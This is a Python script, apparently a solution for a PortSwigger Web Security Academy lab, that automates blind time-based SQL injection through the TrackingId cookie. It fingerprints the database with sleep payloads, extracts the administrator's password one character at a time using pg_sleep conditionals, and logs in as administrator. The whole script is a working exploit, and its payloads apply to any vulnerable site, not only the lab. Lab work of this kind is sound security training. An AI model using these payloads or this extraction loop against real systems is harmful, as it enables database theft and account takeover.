import requests
import argparse
import time
import string
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Blind SQL injection with time delays and information retrieval')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
headers = { 'Cookie': f'session={r.cookies.get("session")};TrackingId={r.cookies.get("TrackingId")}' }

request_time = 0
statements = {
    'Oracle': "dbms_pipe.receive_message(('a'),5)",
    'Microsoft': "WAITFOR DELAY '0:0:5'",
    'PostgreSQL': "SELECT pg_sleep(5)",
    'MySQL': "SELECT SLEEP(5)"
}
password_length = 0
password = ''

for i in statements.values():
    send_time = time.time()
    r = requests.get("https://" + lab.id + f".web-security-academy.net/login", headers={'Cookie':f'TrackingId=\'||({i})-- -'})
    print(f'\'|| ({i})-- -')
    response_time = time.time()
    request_time = response_time - send_time
    print(f"Request time: {request_time}", end='', flush=True)
    print('\r', end='', flush=True)  
    if request_time >= 4.95:
        dbtype = next((key for key, val in statements.items() if val == i), None)
        print(f'\nDatabase identified: {dbtype}')
        break

# GET password LENGTH
for i in range(0, 27):
    send_time = time.time()
    try:
        r = requests.get("https://" + lab.id + f".web-security-academy.net/login", headers={'Cookie':f'TrackingId=\'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users where username =\'administrator\' and LENGTH(password)={i})-- -'})
    except:
        continue
    response_time = time.time()
    request_time = response_time - send_time
    print(f"Request time: {request_time}", end='', flush=True)
    print('\r', end='', flush=True)

    if request_time >= 5:
        password_length = i
        break
print(f"\nPassword length: {password_length}")

# EXTRACT PASSWORD. SAME LOGIC AS EXPLOITING ERRORS, BUT WITH PAUSES INSTEAD AND WAY SLOWER.
for i in range(1, password_length + 1):
    for char in string.ascii_letters + string.digits:
        send_time = time.time()

        r = requests.get("https://" + lab.id + f".web-security-academy.net/login", headers={'Cookie':f'TrackingId=\'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users where username =\'administrator\' and SUBSTRING(password, {i}, 1)=\'{char}\')-- -'})
        
        response_time = time.time()
        request_time = response_time - send_time

        if request_time >= 5:
            password += char
            print(f"Password: {password}", end='', flush=True)
            print('\r', end='', flush=True)        
print(f"\nPassword: {password}")

# LOGIN AS ADMINISTRATOR
data = {
    'csrf': f'{csrf}',
    'username': 'administrator',
    'password': f'{password}'
    }
requests.post('https://' + lab.id + '.web-security-academy.net/login',headers=headers, data=data)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")